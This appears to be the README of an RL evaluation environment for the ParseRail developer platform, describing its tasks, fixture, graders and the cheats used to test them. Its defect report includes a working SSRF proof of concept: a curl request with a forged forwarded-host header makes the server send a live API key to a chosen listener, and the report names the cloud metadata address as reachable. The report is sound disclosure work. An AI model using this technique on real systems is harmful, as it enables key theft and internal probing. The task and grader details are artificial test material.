# parserail-desk

An RL evaluation environment for **ParseRail** (`~/CompoundLabs/parserail`,
<https://parserail.thecompound.tech>), the Compound Labs developer platform: 39 capability
endpoints behind one bearer key, a credit wallet, async jobs, and a signed-in console for keys and
billing.

Five tasks, thirty-eight scripted cheats, thirty-three guards. Every reward reads database rows.

```
./scripts/up.sh                                               # schema, fixture, app on 3769, session
uv run python envs/parserail-desk/adversarial/prove_graders.py
uv run python tools/validate_results.py parserail-desk
```

---

## What is graded, and why it is only these six routes

ParseRail has 57 route handlers. Nearly all of them end in a model call, and **no key is set for
any inference rail in this environment**. `@compound/integrations` resolves the graceful stub, every
capability answers 503 `inference_unavailable`, and `serveEndpoint` charges nothing. That is not a
workaround: grading a capability endpoint any other way means spending `ANTHROPIC_API_KEY`,
`OPENAI_API_KEY` or `GEMINI_API_KEY` to produce a number, which this project does not do.

What is left is everything the product writes with no inference at all, and it is a real surface:

| route | what it writes |
| --- | --- |
| `POST /api/keys` | mints a key, stores sha256 and a public prefix |
| `POST /api/keys/revoke` | stamps `revoked_at`, scoped to the signed-in developer |
| `POST /api/billing/autorecharge` | sets the wallet's auto-recharge pack, gated on a saved card |
| `POST /v1/memory` `op=forget` | deletes memories and charges the wallet. Store and search need an embedding; forget does not |
| `POST /v1/parse` `async=true` | enqueues a job row and returns 202 before any model is touched |
| `GET /v1/jobs/{id}` | polls that job, ownership-scoped |

**No Stripe call is made anywhere in this environment, and no Stripe key is set.** Arming
auto-recharge only reads `default_payment_method` off the wallet, so the fixture seeds the row the
webhook would have written and the route runs for real. `POST /api/billing/topup` is not graded;
see *Not gradable* below.

## The console renders real rows. Measured, not assumed.

Rule 2 says to check what the UI renders for a real signed-in account rather than the demo one,
by driving the page. Driven on 2026-09-19 as `ops@lindmark-freight.example`, uuid `...0f3001`, which
is not a demo account:

| page | rendered |
| --- | --- |
| `/dashboard` | the balance, five billed calls, per-endpoint spend, the eight-week burn chart |
| `/dashboard/keys` | all three of the account's keys, with the revoked one marked revoked |
| `/dashboard/billing` | the statement (top-up plus the folded usage line) and the auto-recharge select |
| `/dashboard/requests` | five billed calls, filterable by key |
| `/dashboard/jobs` | both async jobs, one succeeded and one failed |

Nothing in this product returns a hardcoded empty collection for a non-demo account. Screenshots
are `harness/look-*.png`, produced by `node harness/look.mjs`. Three of the five tasks are therefore
browser tasks; the two bearer-key tasks are API tasks because a bearer key is how a customer uses
them, not because the console could not show them.

## The tasks

| id | driven | route | the seam it is written against |
| --- | --- | --- | --- |
| `mint-the-ingestion-key` | browser | `POST /api/keys` | a key called `ingestion` already exists, revoked in August. Reviving it makes the console show what the task asked for and hands nobody a secret |
| `revoke-the-leaked-key` | browser | `POST /api/keys/revoke` | `prod-ingest` and `prod-ingest-backup` are two live keys one suffix apart. The task names the key by its prefix; a label match takes the wrong one, or both |
| `arm-the-auto-recharge-pack` | browser | `POST /api/billing/autorecharge` | arming is a setting, one text column. Nothing about writing it says a card was charged or a credit was granted |
| `forget-the-shipment-notes` | api | `POST /v1/memory` | both developers have a namespace called `shipment-notes`, and the delete in SQL leaves the console looking right with the call never metered |
| `queue-the-manifest-parse` | api | `POST /v1/parse` + `GET /v1/jobs/{id}` | the product's own promise: a call that does not succeed is never billed, and `redactRequest()` keeps the customer's document out of Postgres |

## The fixture

Two developers on one platform, everything invented.

* **`ops@lindmark-freight.example`**, `00000000-0000-4000-8000-0000000f3001`. 4,958 credits, a card
  on file, three keys (two live, one revoked), agent memories in two namespaces, five billed calls,
  two async jobs.
* **`dev@verrazano-imports.example`**, `00000000-0000-4000-8000-0000000f3002`. 78 credits, **no
  card**, one live key, and a `shipment-notes` namespace carrying the same name as the operator's.
  Nothing any task does may touch a row of theirs.

⛔ **`...0f3001` and `...0f3002` are this environment's namespace in the shared `auth.users`**
(rule 11). `auth.users` is genuinely shared by every environment on this stack; a colliding uuid
fails on `users_pkey` and the second `up.sh` to run is the one that finds out.

## The schema is a shim, and the graders read through it

⛔ **The tables are named `kynth_*` and the product never says that name anywhere.** Every call
site reads `compound_api_keys`, `compound_credit_accounts`, `compound_usage_events`,
`compound_api_jobs`, `compound_agent_memories`, `compound_rate_limits` and four `compound_*` RPCs.
Measured against production (`pg_class.relkind`) on 2026-09-19: **all seven of those relations are
views**, each over one `kynth_*` table the 2026-09-10 rename sweep left behind, and the four RPCs
are SQL wrappers around `kynth_*` functions.

`sql/01-schema.sql` reproduces that topology exactly rather than flattening it, because the shim is
the product's live shape. `parserail_desk/db.py` then reads the `kynth_*` tables underneath on
purpose: a write that reaches the view has to arrive on the table, and a cheat that writes the table
directly has to show up in the same place.

RLS is enabled on all seven tables with **zero policies**, which is production's own posture. The
only client that touches them is the service-role admin client. That is what makes the tenancy
guards real: a cross-tenant write in this environment is something only a cheat holding the service
role can do.

## Not gradable

| what | why |
| --- | --- |
| all 38 other `/v1/*` capability endpoints | each ends in a model call. No inference key is set here and none will be: a score is only ever produced on a free rail. Their refusal path is what `queue-the-manifest-parse` grades |
| `POST /api/billing/topup` | it calls `payments.checkout()`, which needs a live Stripe key and returns a hosted URL. With no key the payments capability resolves to its stub and the route answers 501 |
| `POST /api/webhooks/stripe` | the grant itself is gradable, but reaching it needs a body signed with a Stripe webhook secret, and the pack branch then calls `paymentIntents.retrieve` against the live API |
| `GET /api/cron/monthly-refresh` | the free-tier floor it used to apply was deleted on 2026-09-01. What remains grants All-Access subscribers, and this product has no route that creates one, so the only way to make the task real is to seed the row the grader would then check |
| `GET /api/cron/reap-jobs` | it moves a job on only after a fifteen-minute pickup grace or an expired ten-minute lease. Grading it means a fabricated `lease_expires_at`, which is the grader writing the state it then reads |
| `POST /v1/memory` `op=store` / `op=search` | both call `embedText()`, which is a Gemini embedding request |
| the anonymous playground | it ran real inference on a server-held demo key until 2026-09-01 and the route was deleted. The page now replays frozen recordings, so there is nothing to write and nothing to grade |

## Defects found

### `POST /mcp` hands the caller's API key to a host the request header names. HIGH.

`src/app/mcp/route.ts` builds the origin it calls itself on from the request:

```
const host = req.headers.get("x-forwarded-host") ?? req.headers.get("host");
```

There is no allow-list on it, and `callerFor()` then reaches that origin with a **plain `fetch`**
carrying `Authorization: Bearer <the caller's key>`. Every other outbound call in this product
goes through `src/lib/platform/safe-fetch.ts`, which rejects private and reserved ranges, pins the
socket to the address it validated and refuses redirects. This one is the only server-side
outbound fetch in the codebase that skips it.

Measured on 2026-09-19 against the local build, with a listener on 127.0.0.1:9977:

```
curl -X POST http://127.0.0.1:3769/mcp \
  -H "Authorization: Bearer ksk_live_11aa22bb…" \
  -H "x-forwarded-host: 127.0.0.1:9977" -H "x-forwarded-proto: http" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"compound_account","arguments":{}}}'
```

what the listener received:

```
GET /v1/account HTTP/1.1
host: 127.0.0.1:9977
Authorization: Bearer ksk_live_11aa22bb33cc44dd55ee66ff77008811992200aa
```

Two things follow. It is an **unguarded SSRF sink**: the route will make an authenticated request
to `127.0.0.1`, `169.254.169.254` or any internal address and hand the response body back to the
caller as the tool result, which is exactly what `safe-fetch.ts` was written to stop. And it will
**forward a live `ksk_live_` secret to an attacker-chosen host**. The bearer is the caller's own,
so the direct victim is the caller, which is what keeps this from being cross-tenant; the
mechanism is a server that can be told where to send a working key.

Not fixed here. This environment never writes to the product repo.

### A brand-new account is walked to a call it cannot make. LOW.

`ensureAccount()`
creates a wallet at zero and nothing grants, by design since 2026-09-01. `serveEndpoint`'s balance
precheck then refuses every `/v1` call 402 before any work. The console's own activation flow
(`AutoActivate` on `/dashboard`, auto-opening for a zero-key zero-call account) walks that account
straight to "mint → reveal once → first call", and that first call cannot succeed. It is a product
decision, not a bug in the code, and it is recorded here because the console still presents the
first call as the next step. `results.json` carries it at low severity. Nothing else in this
product's non-inference surface misbehaved: every tenancy scope held (`/api/keys/revoke`,
`/api/billing/autorecharge`, `/v1/memory` forget and `getJob` all scope by account and were each
probed), the charge RPC is atomic across wallet, usage event and ledger, and `redactRequest()` does
keep the document out of Postgres.

### One defect in the environment's own harness, worth recording because it is the rule-7 shape.

`/dashboard/keys` prefills the mint label with `production`, and the field is a React controlled
input: `page.click(el, {clickCount: 3})` does not clear it. The first cut of `rollout.mjs` typed
into it and the field read `productioningestion`, which would have minted a key under that label
with nothing erroring anywhere. The assertion after the type is what caught it.

## Running it without the product

`prove_graders.py` degrades rather than fails. The cheats are pure SQL and always run; the five
honest cases drive the real product, so with nothing serving on 3769 they are SKIPPED with a
printed line. Forty-three expectations with the app up, thirty-eight without it. Both measured on 2026-09-19 and kept in demo/graders.txt and demo/graders-app-down.txt.

## Files

```
sql/01-schema.sql      the kynth_* tables and the compound_* views over them
sql/02-seed.sql        the fixture, TRUNCATE + INSERT, re-applied before every episode
sql/03-rls.sql         RLS on, zero policies, service-role grants: production's own posture
sql/04-functions.sql   the credit, rate-limit and memory-search RPCs, verbatim from production
parserail_desk/db.py       Postgres access for the graders
parserail_desk/taskset.py  the five tasks and their @reward graders
adversarial/prove_graders.py   the honest case and every cheat
harness/signin.mjs     mints the session with @supabase/ssr itself, never a hand-rolled cookie
harness/rollout.mjs    the honest rollout for one task, against the running product
harness/look.mjs       drives every console page and reports what it renders (rule 2)
fixtures/shipment-manifest.txt   the document queued by queue-the-manifest-parse
scripts/up.sh          idempotent bring-up
results.json           the machine-readable result (RESULTS-SCHEMA.md)
```
